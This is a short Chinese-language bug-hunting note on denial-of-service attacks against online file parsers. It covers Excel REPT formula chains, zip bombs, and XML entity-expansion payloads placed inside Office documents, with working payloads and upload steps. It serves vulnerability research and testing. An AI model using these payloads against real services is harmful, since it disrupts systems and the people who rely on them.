通过使目标解析文件造成 DoS.

## 1. Excel

在 Excel 中有一个函数 `=REPT("1",99)` , 表示在一个单元格中写入 99 个 `1` ;

若是一个特别大的值, 如:  `=REPT("1",9999)` ,那么在 Office Excel 则不会解析, 而是返回一个值 `#VALUE!` ;

但是在线文档可能将文字全部解析并造成 DoS;

如果目标网站对 `=REPT("1",99)` 数量有限制, 可尝试引用单元格绕过:

```
=REPT("1",9)
=REPT(A1,9)
=REPT(A2,9)
=REPT(A3,9)
```

## 2. Zip

在线解压高压缩率的 zip 文件会造成 DoS, 若目标无法解压这个文件则不存在 DoS.

访问 [A better zip bomb](https://www.bamsoftware.com/hacks/zipbomb/) 得到 zip 文件.

## 3. XML

Word, Excel, PowerPoint 文件解压后存在 XML 文件, 压缩后可回复文档.

可利用 XML 的内部实体的循环引用造成 DoS

```
<!DOCTYPE w:t [
	<!ENTITY PoC "test">
	<!ENTITY PoC2 "&PoC;&PoC;&PoC;&PoC;&PoC;&PoC;">
	<!ENTITY PoC3 "&PoC2;&PoC2;&PoC2;&PoC2;&PoC2;&PoC2;">
]>
```

1. 在文档中写入 `Hello, World!` , 方便定位;

2. 使用解压工具打开文档;

3. 找到存在 `Hello, World!` 的 XML 文件;

   ```
   C:\Users\sec\Desktop\Microsoft Word 文档\word\document.xml
   C:\Users\sec\Desktop\Microsoft Excel 工作表\xl\sharedStrings.xml
   C:\Users\sec\Desktop\Microsoft PowerPoint 演示文稿\ppt\slides\slide1.xml
   ```

4. 在 XML 文件中添加内部实体引用

   ```
   <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
   <!DOCTYPE w:t [
   	<!ENTITY PoC "test">
   	<!ENTITY PoC2 "&PoC;&PoC;&PoC;&PoC;&PoC;&PoC;">
   	<!ENTITY PoC3 "&PoC2;&PoC2;&PoC2;&PoC2;&PoC2;&PoC2;">
   ]>
   <w:document>
   	<w:t>Hello, World!&PoC3;</w:t>
   </w:document>
   ```

5. 保存后上传到在线文档解析则可能造成 DoS.

---

参考链接

- [企业src中dos漏洞的挖掘【小火炬公开课】](https://www.bilibili.com/video/BV1xYweeKELq/?spm_id_from=333.1387.favlist.content.click&vd_source=2dcc7806c9580af60063ca1edb63852d)
- [A better zip bomb](https://www.bamsoftware.com/hacks/zipbomb/)
- [XML 拒绝服务攻击和防御](https://learn.microsoft.com/zh-cn/archive/msdn-magazine/2009/november/xml-denial-of-service-attacks-and-defenses)